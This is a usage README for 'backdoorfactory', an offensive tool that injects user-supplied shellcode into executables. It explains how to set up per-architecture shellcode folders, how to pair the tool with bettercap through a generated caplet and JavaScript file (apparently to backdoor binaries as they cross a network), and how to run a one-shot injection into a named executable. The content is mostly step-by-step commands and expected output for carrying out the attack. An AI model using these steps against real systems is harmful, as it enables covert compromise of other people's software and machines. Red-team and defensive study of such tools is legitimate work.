# Usage

First, the shellcode directory must be initialized.  

Then, you must copy your shellcodes into the appropriate places in the shellcode directory structure.  

Finally, **backdoorfactory** and **bettercap** can be started.

## Shellcode Directory Initialization

Run the following command and set the `-d` argument to the path to your intended shellcode directory.  It will be created if it does not exist.

`./backdoorfactory -d shellcodes -i`

You should see a response like:

`2020/05/11 17:04:02 Shellcode Directories Initialized, copy shellcode files with .bin extensions into each directory.`

## Copy Shellcode Into Directory

Your shellcodes can have any filename, as long as they have the extension `.bin`

Copy the shellcode you want to inject into binaries into the appropriate folders for each architecture and binary format you want to target.

For example, a Linux x64 shellcode could be copied to:
`shellcodes/linux/x64/shellcode.bin`

Your shellcodes do not need to worry about the state of the stack or the details of injection, [binjection](https://github.com/Binject/binjection) handles all of that.

## Running backdoorfactory and bettercap

First, start **backdoorfactory**.  It will generate the caplet file and the Javascript file that **bettercap** will use for you.

`./backdoorfactory -d shellcodes/`

You should see a response like this:
```
2020/05/11 17:22:22 RUN THIS COMMAND in another terminal:
        bettercap -caplet /home/user/bdf/binject.cap
Opening named pipe for writing
Opening named pipe for reading
```

Copy that command line to another terminal session (this one is busy running the pipe server that **bettercap** needs to talk to **backdoorfactory**).  The paths to your binject.cap file may be different than above.  

You can move those files before running bettercap with them, but make sure the binject.js file is always in the same directory as the binject.cap file.

In another session, run (with the real path to binject.cap):

`bettercap -caplet /home/user/bdf/binject.cap`

This will start a bettercap session.

If you want to make edits to the default caplet and Javascript files, simply copy them out, edit them, and pass in your modified script as arguments to **bettercap**.


## Oneshot Test Mode
To test a single injection without having **bettercap** working, **backdoorfactory** has two flags for ***Oneshot Test Mode***, which will use your shellcode directory setup to attempt a single injection to a given binary file.

### Flags
`-t` or `--testfile` to select the input binary to inject into

`-o` or `--output` to select the output injected file name

### Example

`./backdoorfactory -d shellcodes -t input.exe -o injected.exe`
